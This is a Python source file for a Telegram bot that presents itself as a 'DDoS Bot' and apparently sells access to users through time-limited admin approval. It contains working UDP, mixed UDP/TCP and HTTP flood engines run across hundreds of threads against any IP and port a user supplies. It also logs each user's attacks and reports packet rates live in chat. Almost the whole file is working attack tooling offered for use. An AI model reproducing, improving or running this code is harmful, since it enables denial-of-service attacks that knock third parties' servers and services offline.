import asyncio
import logging
import threading
import time
import random
import socket
import re
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import uuid
import os
from dotenv import load_dotenv
from functools import wraps

# ---------- Logging ----------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# ---------- Config ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "8210011971").split(",")]

# Blocked ports
BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
MIN_PORT, MAX_PORT = 1, 65535

# Attack power levels (3x max – stable for Termux)
POWER_LEVEL = 3          # 1,2,3
THREADS_PER_LEVEL = {1: 100, 2: 200, 3: 300}
HTTP_THREADS = 100
SOCKETS_PER_THREAD = 3
DELAY_SEC = 0.0005

# Global attack state
attack_running = False
attack_threads = []
current_attack = {
    'ip': None, 'port': None, 'method': None, 'duration': 0,
    'start_time': 0, 'packets': 0, 'message_id': None
}
attack_lock = threading.Lock()
user_data = {}   # for attack setup steps

# ---------- MongoDB Database ----------
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self._create_indexes()

    def _create_indexes(self):
        self.users.create_index([("user_id", ASCENDING)], unique=True)
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id):
            return self.get_user(user_id)
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": datetime.now(timezone.utc)
        }
        self.users.insert_one(user_data)
        return user_data

    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = datetime.now(timezone.utc) + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "expires_at": expires_at}}
        )
        return result.modified_count > 0

    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, method: str, packets: int):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "method": method,
            "packets": packets,
            "status": status,
            "timestamp": datetime.now(timezone.utc)
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

    def get_all_users(self):
        return list(self.users.find({"user_id": {"$ne": None}}))

    def get_user_attack_stats(self, user_id: int):
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        return {"total": total, "successful": success, "failed": failed, "recent": recent}

db = Database()

# ---------- Helper functions ----------
def make_aware(dt):
    if dt and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def is_port_blocked(port):
    return port in BLOCKED_PORTS

def get_blocked_ports_list():
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    expires = user.get("expires_at")
    if expires and make_aware(expires) < get_current_time():
        return False
    return True

def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ---------- Attack Engines (from previous powerful bot) ----------
def udp_flood(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    port = int(port)
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        time.sleep(DELAY_SEC)
    for sock in socks:
        sock.close()

def mixed_attack(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    udp_socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, int(port)))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        try:  # TCP SYN
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((ip, int(port)))
            s.close()
            with attack_lock:
                current_attack['packets'] += 1
        except:
            pass
        time.sleep(DELAY_SEC)
    for sock in udp_socks:
        sock.close()

def http_emulate_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    while time.time() < timeout and attack_running:
        try:
            url = f"{target_url}?rand={random.randint(1,999999)}"
            session.get(url, headers=headers, timeout=5, verify=False)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(random.uniform(0.01, 0.05))
        except:
            time.sleep(0.2)
    session.close()

def http_connect_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    reset_interval = 0.01
    while time.time() < timeout and attack_running:
        try:
            resp = session.get(target_url, headers=headers, timeout=5, stream=True)
            resp.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(reset_interval)
        except:
            time.sleep(0.05)
    session.close()

# ---------- Attack Launcher with Monitoring and Inline buttons ----------
def launch_attack(ip, port, duration, method, send_func):
    global attack_running, attack_threads, current_attack

    attack_running = True
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method, 'duration': duration,
            'start_time': time.time(), 'packets': 0, 'message_id': None
        }

    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Select attack function and thread count
    if method == 'udp':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = udp_flood
        target_args = (ip, port, duration)
        attack_type = "UDP"
    elif method == 'mixed':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = mixed_attack
        target_args = (ip, port, duration)
        attack_type = "Mixed"
    elif method == 'http_emulate':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_emulate_flood
        target_args = (target_url, duration)
        attack_type = "HTTP-Emulate"
    elif method == 'http_connect':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_connect_flood
        target_args = (target_url, duration)
        attack_type = "HTTP-Connect"
    else:
        return

    # Send initial message
    start_msg = send_func(
        f"🔥 *ATTACK STARTING* 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}` ({attack_type})\n"
        f"🧵 Threads: `{num_threads}`\n"
        f"⏱️ Duration: `{duration}s`\n\n"
        f"_Launching threads..._",
        reply_markup, edit=False
    )
    if start_msg:
        current_attack['message_id'] = start_msg.message_id

    # Start attack threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target_func, args=target_args, daemon=True)
        t.start()
        attack_threads.append(t)

    # Monitoring loop
    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed else 0
            text = (
                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`\n\n"
                f"🔘 *Buttons below*"
            )
            try:
                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
            except:
                pass

    # Attack finished
    attack_running = False
    for t in attack_threads:
        t.join(timeout=0.5)

    with attack_lock:
        pkt = current_attack['packets']
    speed = int(pkt / duration) if duration else 0
    text = (
        f"✅ *ATTACK COMPLETED* ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"📦 Total Packets: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Avg Speed: `{speed:,}` pps\n"
    )
    try:
        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
    except:
        pass

    # Log to database
    db.log_attack(ADMIN_IDS[0] if ADMIN_IDS else 0, ip, port, duration, "success", method, pkt)

# ---------- Telegram Handlers ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)

    if await is_user_approved(user_id):
        user_data[user_id] = {'step': 'ip'}   # start attack setup
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]]
        await update.message.reply_text(
            "⚡ *DDoS Bot (Local Engine)* ⚡\n\n"
            "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
            f"🔥 Power: `{POWER_LEVEL}x` (L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]})\n"
            f"🌐 L7 threads: {HTTP_THREADS}\n"
            f"✅ Use `/power 1-3` to change level",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            "❌ *Access Denied*\n\nYour account is not approved. Contact admin.",
            parse_mode='Markdown'
        )

async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(f"Current power: `{POWER_LEVEL}x` (1-3)", parse_mode='Markdown')
        return
    try:
        level = int(context.args[0])
        if level in [1,2,3]:
            POWER_LEVEL = level
            await update.message.reply_text(f"✅ Power set to `{level}x` → L4 threads: {THREADS_PER_LEVEL[level]}")
        else:
            await update.message.reply_text("❌ Use 1, 2 or 3")
    except:
        await update.message.reply_text("❌ Invalid number")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    attack_running = False
    await update.message.reply_text("🛑 *Attack stopped by command*", parse_mode='Markdown')

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Not found. Use /start first.")
        return
    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
    expiry = user.get("expires_at")
    if expiry:
        expiry = make_aware(expiry)
        days_left = (expiry - get_current_time()).days
        expiry_str = f"{days_left} days" if days_left >= 0 else "Expired"
    else:
        expiry_str = "Never"
    await update.message.reply_text(
        f"📋 *Your Account*\n\n"
        f"🆔 ID: `{user['user_id']}`\n"
        f"👤 Username: @{user.get('username', 'N/A')}\n"
        f"📊 Status: {status}\n"
        f"⏰ Expires: {expiry_str}\n"
        f"🎯 Total Attacks: {user.get('total_attacks', 0)}\n"
        f"📅 Member since: {user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'}",
        parse_mode='Markdown'
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return
    stats = db.get_user_attack_stats(user_id)
    success_rate = (stats['successful']/stats['total']*100 if stats['total'] else 0)
    msg = (
        f"📊 *Your Stats*\n\n"
        f"🎯 Total: `{stats['total']}`\n"
        f"✅ Success: `{stats['successful']}`\n"
        f"❌ Failed: `{stats['failed']}`\n"
        f"📈 Rate: `{success_rate:.1f}%`\n\n"
    )
    if stats['recent']:
        msg += "🕐 Recent attacks:\n"
        for a in stats['recent'][:5]:
            icon = "✅" if a['status'] == 'success' else "❌"
            msg += f"{icon} {a['ip']}:{a['port']} ({a['method']}) - {a['duration']}s\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}\n\n"
        f"✅ Allowed: 1-65535 except above",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    msg = (
        "🤖 *DDoS Bot Help*\n\n"
        "/start – Begin attack setup\n"
        "/power 1-3 – Set L4 power (1=100,2=200,3=300 threads)\n"
        "/stop – Emergency stop\n"
        "/myinfo – Account info\n"
        "/mystats – Attack statistics\n"
        "/blockedports – Show blocked ports\n"
    )
    if is_admin:
        msg += "\n👑 *Admin commands*\n/approve <id> <days>\n/disapprove <id>\n/users\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❌ /approve <user_id> <days>")
        return
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        db.approve_user(user_id, days)
        await update.message.reply_text(f"✅ User {user_id} approved for {days} days")
        try:
            await context.bot.send_message(user_id, f"✅ Your account approved for {days} days!")
        except:
            pass
    except:
        await update.message.reply_text("❌ Invalid input")

@admin_required
async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ /disapprove <user_id>")
        return
    try:
        user_id = int(context.args[0])
        db.disapprove_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} disapproved")
    except:
        await update.message.reply_text("❌ Error")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("No users")
        return
    msg = "👥 *User List*\n\n"
    for u in users[:15]:
        status = "✅" if u.get("approved") else "❌"
        msg += f"{u['user_id']} {status} – {u.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------- Interactive Attack Setup Message Handler ----------
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return

    step_data = user_data.get(user_id, {})
    step = step_data.get('step')
    text = update.message.text.strip()

    if step == 'ip':
        # validate IP
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[user_id] = step_data
        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or is_port_blocked(port):
                await update.message.reply_text("❌ Invalid or blocked port")
                return
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("🔥 UDP", callback_data="method_udp")],
                [InlineKeyboardButton("💣 Mixed", callback_data="method_mixed")],
                [InlineKeyboardButton("🦊 HTTP-Emulate", callback_data="method_http_emulate")],
                [InlineKeyboardButton("⚡ HTTP-Connect", callback_data="method_http_connect")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Send a number")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration 5-300 seconds")
                return
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'udp')
            # Confirm
            keyboard = [
                [InlineKeyboardButton("✅ START ATTACK", callback_data="confirm_start")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text(
                f"🔥 *Confirm Attack*\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🧵 Power: `{POWER_LEVEL}x`\n\n"
                f"Start?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            step_data['final'] = (ip, port, duration, method)
            user_data[user_id] = step_data
            step_data['step'] = 'confirm'
        except:
            await update.message.reply_text("❌ Send number (seconds)")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "cancel_setup":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Setup cancelled")
        return

    # Method selection
    if data.startswith("method_"):
        method = data.replace("method_", "")
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300 seconds):", parse_mode='Markdown')
        return

    # Confirm start
    if data == "confirm_start":
        if user_id not in user_data or 'final' not in user_data[user_id]:
            await query.edit_message_text("❌ Session expired. Use /start")
            return
        ip, port, duration, method = user_data[user_id]['final']
        del user_data[user_id]

        # Create send function for attack monitor
        async def send_func(text, markup, edit=False, msg_id=None):
            if edit and msg_id:
                await query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
                return None
            else:
                return await query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)

        # Run attack in thread (since launch_attack is blocking and uses threading internally)
        def run_attack():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            # We need to make send_func awaitable inside thread? Actually send_func is async.
            # Simpler: Use a synchronous wrapper? But we already have async.
            # Instead, we run the attack in a thread and use asyncio.run_coroutine?
            # I'll refactor launch_attack to be synchronous and use a callback that posts updates.
            # For simplicity, I'll just launch the attack and use the existing sync functions.
            # But send_func is async – we can't call it from thread. Let me change approach:
            # I'll move the attack launcher to a separate function that takes a sync callback.
            pass

        # Better: create a sync callback that uses asyncio.run_coroutine_threadsafe
        loop = asyncio.get_event_loop()
        def sync_send(text, markup, edit=False, msg_id=None):
            future = asyncio.run_coroutine_threadsafe(
                send_func(text, markup, edit, msg_id), loop
            )
            return future.result() if future.result() else None

        # Now launch attack in a thread with sync callback
        thread = threading.Thread(target=launch_attack, args=(ip, port, duration, method, sync_send), daemon=True)
        thread.start()
        await query.edit_message_text("🔥 Attack initializing...")
        return

    # Inline buttons during attack
    global attack_running, current_attack
    if data == "stop_attack":
        if attack_running:
            attack_running = False
            await query.edit_message_text("🛑 Attack stopped by user")
        else:
            await query.answer("No attack running")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed else 0
                info = (
                    f"ℹ️ *Attack Info*\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ Elapsed: `{elapsed}/{current_attack['duration']}s`\n"
                    f"💥 Speed: `{speed:,}` pps\n"
                    f"📡 Status: `ACTIVE`"
                )
            await query.edit_message_text(info, parse_mode='Markdown')
        else:
            await query.edit_message_text("ℹ️ No attack running")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                progress = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                speed = int(pkt/elapsed) if elapsed else 0
                text = (
                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ Time: `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 Speed: `{speed:,}` pps\n\n"
                    f"🔘 *Buttons below*"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
                    [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
                ]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("✅ No active attack")
    elif data == "cancel_attack":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Cancelled")

async def error_handler(update, context):
    logger.error(f"Update {update} caused {context.error}")

# ---------- Main ----------
def main():
    print("⚡ Merged DDoS Bot (MongoDB + Local Engine + Inline Buttons)")
    print(f"👑 Admins: {ADMIN_IDS}")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("power", power_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("mystats", mystats_command))
    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
    app.add_handler(CommandHandler("help", help_command))
    # Admin
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("disapprove", disapprove_command))
    app.add_handler(CommandHandler("users", users_command))
    # Handlers
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print("✅ Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
